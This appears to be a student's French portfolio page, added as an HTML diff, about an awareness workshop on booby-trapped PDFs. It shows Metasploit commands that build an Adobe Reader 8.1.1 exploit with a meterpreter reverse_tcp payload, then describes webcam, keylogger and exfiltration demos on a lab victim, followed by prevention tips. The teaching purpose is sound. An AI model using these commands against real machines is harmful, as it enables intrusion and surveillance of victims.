@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Forum Cybersécurité — Paco</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,500;1,300;1,400&family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../styles.css" />
+  <link rel="stylesheet" href="project.css" />
+  <style>
+    .proj-hero { min-height: 40vh; padding-top: 120px; padding-bottom: 56px; }
+    .proj-content-ctx { padding-top: 56px !important; padding-bottom: 56px !important; }
+
+    /* Terminal blocks */
+    .cyber-terminal {
+      background: #0f172a;
+      border-radius: 10px;
+      overflow: hidden;
+      border: 1.5px solid rgba(26,26,26,.1);
+      margin-top: 20px;
+    }
+    .cyber-terminal-bar {
+      background: #1e293b;
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      border-bottom: 1px solid rgba(255,255,255,.06);
+    }
+    .cyber-terminal-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+    }
+    .cyber-terminal-body {
+      padding: 16px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .cyber-cmd {
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: .78rem;
+      line-height: 1.6;
+      color: #94a3b8;
+    }
+    .cyber-cmd .p { color: #f472b6; }
+    .cyber-cmd .b { color: #60a5fa; }
+    .cyber-cmd .g { color: #34d399; }
+
+    /* Infrastructure table */
+    .cyber-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: .82rem;
+      margin-top: 16px;
+    }
+    .cyber-table th {
+      text-align: left;
+      padding: 10px 16px;
+      background: rgba(26,26,26,.04);
+      font-weight: 500;
+      font-size: .7rem;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+      color: var(--black);
+      opacity: .5;
+      border-bottom: 1.5px solid rgba(26,26,26,.08);
+    }
+    .cyber-table td {
+      padding: 12px 16px;
+      border-bottom: 1px solid rgba(26,26,26,.06);
+      color: var(--black);
+      opacity: .75;
+      vertical-align: top;
+    }
+    .cyber-table td:first-child {
+      font-weight: 500;
+      opacity: 1;
+      color: var(--black);
+    }
+    .cyber-table tr:last-child td { border-bottom: none; }
+
+    /* Prévention block */
+    .cyber-prevention {
+      background: rgba(16,185,129,.05);
+      border: 1.5px solid rgba(16,185,129,.2);
+      border-radius: 16px;
+      padding: 40px;
+      margin-top: 0;
+    }
+    .cyber-prevention-title {
+      font-size: .72rem;
+      font-weight: 500;
+      letter-spacing: .16em;
+      text-transform: uppercase;
+      color: #10b981;
+      margin-bottom: 16px;
+      display: block;
+    }
+    .cyber-prevention-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 20px;
+    }
+    .cyber-prevention-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: .84rem;
+      color: var(--black);
+      opacity: .7;
+      line-height: 1.55;
+    }
+    .cyber-prevention-item::before {
+      content: '';
+      display: block;
+      width: 7px;
+      height: 7px;
+      border-radius: 2px;
+      background: #10b981;
+      flex-shrink: 0;
+    }
+
+    /* Schémas images */
+    .cyber-schema-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      margin-top: 4px;
+    }
+    .cyber-schema-item {
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1.5px solid rgba(26,26,26,.1);
+    }
+    .cyber-schema-item img {
+      width: 100%;
+      display: block;
+      background: #fff;
+    }
+    .cyber-schema-label {
+      padding: 8px 14px;
+      font-size: .75rem;
+      color: var(--black);
+      opacity: .45;
+      background: rgba(26,26,26,.03);
+      border-top: 1px solid rgba(26,26,26,.06);
+      text-align: center;
+    }
+
+    @media (max-width: 768px) {
+      .cyber-prevention-grid { grid-template-columns: 1fr; }
+      .cyber-schema-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="proj-nav">
+  <a href="../index.html#projets" class="proj-nav-back">
+    <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+      <path d="M13 7 L1 7 M6 2 L1 7 L6 12" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    Retour au portfolio
+  </a>
+  <a href="../index.html" class="proj-nav-logo">Paco.</a>
+</nav>
+
+<!-- ─── HERO ───────────────────────────────── -->
+<section class="proj-hero">
+  <div class="proj-hero-inner">
+    <span class="proj-eyebrow">Scolaire — BTS SIO · 2025</span>
+    <h1><em>Forum Cybersécurité</em></h1>
+    <div class="proj-hero-meta">
+      <div class="proj-hero-meta-item">
+        <span class="proj-hero-meta-label">Type</span>
+        <span class="proj-hero-meta-value">Sensibilisation & Atelier</span>
+      </div>
+      <div class="proj-hero-meta-item">
+        <span class="proj-hero-meta-label">Stack</span>
+        <span class="proj-hero-meta-value">Kali Linux · Metasploit · HTML</span>
+      </div>
+      <div class="proj-hero-meta-item">
+        <span class="proj-hero-meta-label">Participants</span>
+        <span class="proj-hero-meta-value">700+</span>
+      </div>
+      <div class="proj-hero-meta-item">
+        <span class="proj-hero-meta-label">Liens</span>
+        <span class="proj-hero-meta-value">
+          <a class="proj-hero-link" href="https://github.com/pacobrnt/atelierpdfebook" target="_blank" rel="noopener">GitHub ↗</a>
+        </span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── CAROUSEL ──────────────────────────── -->
+<div class="proj-carousel">
+  <div class="proj-carousel-browser" id="c1">
+    <div class="proj-carousel-bar">
+      <div class="proj-carousel-dots-bar">
+        <div class="proj-carousel-dot-bar"></div>
+        <div class="proj-carousel-dot-bar"></div>
+        <div class="proj-carousel-dot-bar"></div>
+      </div>
+      <div class="proj-carousel-url">
+        <div class="proj-carousel-url-dot"></div>
+        <span class="proj-carousel-url-text">Forum Cybersécurité — BTS SIO</span>
+      </div>
+    </div>
+    <div class="proj-carousel-viewport">
+      <button class="proj-carousel-tap proj-carousel-tap-l" aria-label="Précédent"></button>
+      <button class="proj-carousel-tap proj-carousel-tap-r" aria-label="Suivant"></button>
+      <div class="proj-carousel-track">
+        <div class="proj-carousel-slide active"><img src="../img/projets/forumcyber/accueil.png" alt="Accueil du forum"></div>
+        <div class="proj-carousel-slide"><img src="../img/projets/forumcyber/contact.png" alt="Page contact"></div>
+        <div class="proj-carousel-slide"><img src="../img/projets/forumcyber/formation.png" alt="Formation"></div>
+        <div class="proj-carousel-slide"><img src="../img/projets/forumcyber/formationinstalle.png" alt="Formation installée"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="proj-carousel-progress-wrap">
+    <div class="proj-carousel-dots">
+      <button class="proj-carousel-dot active"><div class="proj-carousel-dot-fill"></div></button>
+      <button class="proj-carousel-dot"><div class="proj-carousel-dot-fill"></div></button>
+      <button class="proj-carousel-dot"><div class="proj-carousel-dot-fill"></div></button>
+      <button class="proj-carousel-dot"><div class="proj-carousel-dot-fill"></div></button>
+    </div>
+    <span class="proj-carousel-counter">01 / 02</span>
+  </div>
+</div>
+
+<!-- ─── CONTENU ───────────────────────────── -->
+<div class="proj-content proj-content-ctx">
+  <div class="proj-content-inner">
+
+    <!-- Contexte + Objectifs -->
+    <div class="proj-content-grid-2">
+      <div class="proj-block">
+        <span class="proj-block-title">Contexte & Mission</span>
+        <p class="proj-about-text">
+          Le <strong>Forum Cybersécurité</strong>, lancé par les enseignants du BTS SIO, a pour but de sensibiliser élèves et personnels aux menaces numériques. J'ai participé à l'édition 2025 en tant qu'intervenant.
+        </p>
+        <p class="proj-about-text" style="margin-top:16px">
+          Notre mission était d'animer un atelier pratique sur les <strong>dangers des fichiers PDF piégés</strong>. L'événement a rassemblé plus de <strong>700 participants</strong> au Lycée Gabriel Fauré et au Collège de Groisy.
+        </p>
+      </div>
+
+      <div class="proj-block">
+        <span class="proj-block-title">Objectifs</span>
+        <div class="proj-feature-list">
+          <div class="proj-feature-item">
+            <span class="proj-feature-sq" style="--sq-color:#6366f1"></span>
+            Analyser un fichier suspect.
+          </div>
+          <div class="proj-feature-item">
+            <span class="proj-feature-sq" style="--sq-color:#10b981"></span>
+            Comprendre l'exploitation PDF.
+          </div>
+          <div class="proj-feature-item">
+            <span class="proj-feature-sq" style="--sq-color:#f59e0b"></span>
+            Démonstration des conséquences (Keylogger, Webcam).
+          </div>
+          <div class="proj-feature-item">
+            <span class="proj-feature-sq" style="--sq-color:#f43f5e"></span>
+            Adopter les bons réflexes.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Infrastructure -->
+    <div class="proj-content-grid-2-equal">
+      <div class="proj-block">
+        <span class="proj-block-title">Infrastructure de l'Atelier</span>
+        <table class="cyber-table">
+          <thead>
+            <tr>
+              <th>Équipement</th>
+              <th>PC Attaquant</th>
+              <th>PC Victime</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>OS & Rôle</td>
+              <td>Kali Linux (Metasploit)</td>
+              <td>Windows 10 (Vulnérable)</td>
+            </tr>
+            <tr>
+              <td>Périphériques</td>
+              <td>Clavier, Souris, Vidéoprojecteur</td>
+              <td>Clavier, Souris, Webcam</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="proj-block">
+        <span class="proj-block-title">Stack technique</span>
+        <div class="proj-stack-list">
+          <div class="proj-stack-item">
+            <img src="https://cdn.simpleicons.org/kalilinux/1a1a1a" alt="Kali Linux">
+            Kali Linux
+          </div>
+          <div class="proj-stack-item">
+            <img src="https://cdn.simpleicons.org/metasploit" alt="Metasploit">
+            Metasploit Framework
+          </div>
+          <div class="proj-stack-item">
+            <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/html5/html5-original.svg" alt="HTML5">
+            HTML — Site leurre
+          </div>
+          <div class="proj-stack-item">
+            <span class="proj-stack-icon">📄</span>
+            Adobe Reader 8.1.1 (CVE)
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Configuration attaque + Scénario -->
+    <div class="proj-content-grid-2-equal">
+      <div class="proj-block">
+        <span class="proj-block-title">Configuration de l'attaque</span>
+        <p class="proj-about-text">
+          Utilisation de Metasploit pour générer un PDF malveillant exploitant une faille Adobe Reader 8.1.1.
+        </p>
+        <div class="cyber-terminal">
+          <div class="cyber-terminal-bar">
+            <div class="cyber-terminal-dot" style="background:#ff5f57"></div>
+            <div class="cyber-terminal-dot" style="background:#febc2e"></div>
+            <div class="cyber-terminal-dot" style="background:#28c840"></div>
+          </div>
+          <div class="cyber-terminal-body">
+            <div class="cyber-cmd"><span class="p">root@kali:~#</span> msfconsole</div>
+            <div class="cyber-cmd"><span class="b">msf &gt;</span> search type:exploit platform:windows adobe pdf</div>
+            <div class="cyber-cmd"><span class="b">msf &gt;</span> use exploit/windows/fileformat/adobe_pdf_embedded_exe</div>
+            <div class="cyber-cmd">
+              <span class="b">msf exploit &gt;</span> set PAYLOAD windows/meterpreter/reverse_tcp<br>
+              <span class="b">msf exploit &gt;</span> set LHOST 192.168.10.200<br>
+              <span class="b">msf exploit &gt;</span> <span class="g">exploit</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="proj-block">
+        <span class="proj-block-title">Scénario & Impact</span>
+        <p class="proj-about-text">
+          Les participants naviguent sur un faux site d'e-books promettant la richesse. Trois fichiers sont proposés, dont un seul est infecté (<code style="font-family:monospace;font-size:.82em;background:rgba(26,26,26,.06);padding:2px 6px;border-radius:4px">ebook1.pdf</code>).
+        </p>
+        <p class="proj-about-text" style="margin-top:16px">
+          Dès l'ouverture, une session <strong>Meterpreter</strong> s'ouvre sur le PC Kali. Nous démontrons alors la prise de contrôle : activation de la webcam, keylogger et exfiltration de données.
+        </p>
+        <div class="proj-arch-list" style="margin-top:20px">
+          <div class="proj-arch-item">
+            <span class="proj-arch-tag" style="--tag-color:#f43f5e">Webcam</span>
+            <div><div class="proj-arch-item-desc">Activation silencieuse de la caméra de la victime.</div></div>
+          </div>
+          <div class="proj-arch-item">
+            <span class="proj-arch-tag" style="--tag-color:#f59e0b">Keylogger</span>
+            <div><div class="proj-arch-item-desc">Enregistrement de toutes les frappes clavier.</div></div>
+          </div>
+          <div class="proj-arch-item">
+            <span class="proj-arch-tag" style="--tag-color:#6366f1">Exfiltration</span>
+            <div><div class="proj-arch-item-desc">Accès aux fichiers et données sensibles du système.</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- Prévention -->
+    <div class="cyber-prevention">
+      <span class="cyber-prevention-title">Prévention & Bonnes pratiques</span>
+      <p class="proj-about-text">
+        Pour la démonstration, Windows Defender était désactivé. En conditions réelles, un antivirus à jour aurait bloqué la menace.
+      </p>
+      <div class="cyber-prevention-grid">
+        <div class="cyber-prevention-item">Ne jamais ouvrir de PDF provenant de sources inconnues.</div>
+        <div class="cyber-prevention-item">Utiliser un lecteur PDF sécurisé (ex : Sumatra PDF).</div>
+        <div class="cyber-prevention-item">Désactiver le JavaScript dans Adobe Reader.</div>
+        <div class="cyber-prevention-item">Scanner les fichiers suspects sur VirusTotal.</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ─── CTA ───────────────────────────────── -->
+<section class="proj-cta">
+  <a href="https://github.com/pacobrnt/atelierpdfebook" target="_blank" rel="noopener" class="btn"><span>Voir le code source ↗</span></a>
+</section>
+
+<script src="project.js"></script>
+</body>
+</html>
